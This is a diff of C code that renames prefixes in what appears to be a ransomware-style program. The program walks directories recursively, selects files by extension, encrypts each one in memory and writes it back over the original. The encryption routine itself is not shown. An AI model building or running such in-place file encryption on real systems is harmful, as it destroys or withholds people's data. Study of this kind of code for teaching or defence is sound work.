@@ -2,9 +2,9 @@
 
 bool is_entry_handled(const char *foldername)
 {
-	char *dir_paths[FA_UNHANDLED_DIRS_ARRAY_SIZE] = FA_UNHANDLED_DIRS;
+	char *dir_paths[SH_UNHANDLED_DIRS_ARRAY_SIZE] = SH_UNHANDLED_DIRS;
 
-	for (size_t i = 0; i < FA_UNHANDLED_DIRS_ARRAY_SIZE; ++i)
+	for (size_t i = 0; i < SH_UNHANDLED_DIRS_ARRAY_SIZE; ++i)
 		if (strcmp(foldername, dir_paths[i]) == 0)
 			return false;
 
@@ -23,7 +23,7 @@ bool is_created_file(
 	return false; // File is not in the created files list
 }
 
-void handle_file(fa_t_env *env, const char *filepath)
+void handle_file(t_env *env, const char *filepath)
 {
 	/* Create a mapping between the target file and the memory region occupied
 	 * by the program. This is to facilitate the memory handling to manipulate
@@ -32,28 +32,28 @@ void handle_file(fa_t_env *env, const char *filepath)
 	 * Then, process the encryption
 	 */
 
-	if (fa_map_file_into_memory(env, filepath))
-		if (env->g_modes & FA_VERBOSE) {
+	if (map_file_into_memory(env, filepath))
+		if (env->g_modes & SH_VERBOSE) {
 			perror("An error occurred while attempting to map the file into memory");
 			return;
 		}
 
-	if (fa_process_mapped_data(env))
-		if (env->g_modes & FA_VERBOSE) {
+	if (process_mapped_data(env))
+		if (env->g_modes & SH_VERBOSE) {
 			perror("An error occurred while attempting to process the mapped data");
 			return;
 		}
 
 	// Write the final file data in the target path
-	if (fa_write_processed_data_to_file(env, filepath))
-		if (env->g_modes & FA_VERBOSE)
+	if (write_processed_data_to_file(env, filepath))
+		if (env->g_modes & SH_VERBOSE)
 			perror("An error occurred while attempting to write the mapped data into the file");
 }
 
-void handle_dir(fa_t_env *env, char *target_dir_path)
+void handle_dir(t_env *env, char *target_dir_path)
 {
 	// A list of the created files during the process
-	char *created_files[FA_MAX_FILES];
+	char *created_files[SH_MAX_FILES];
 	size_t created_files_count = 0;
 	// Pointer to hold directory entry information
 	struct dirent *entry;
@@ -79,16 +79,16 @@ void handle_dir(fa_t_env *env, char *target_dir_path)
 			// Check if it's a directory
 			if (stat(path, &statbuf) == 0 && S_ISDIR(statbuf.st_mode))
 			{
-				if (env->g_modes & FA_VERBOSE) printf("[DIR] %s\n", path);
+				if (env->g_modes & SH_VERBOSE) printf("[DIR] %s\n", path);
 
 				// Recursive call for subdirectories
 				handle_dir(env, path);
 			}
 			else
 			{
-				if (env->g_modes & FA_VERBOSE) printf("[FILE] %s\n", path);
+				if (env->g_modes & SH_VERBOSE) printf("[FILE] %s\n", path);
 
-				if (created_files_count < FA_MAX_FILES &&
+				if (created_files_count < SH_MAX_FILES &&
 					is_extension_handled(env, path) &&
 					!is_created_file(created_files, created_files_count, path))
 				{
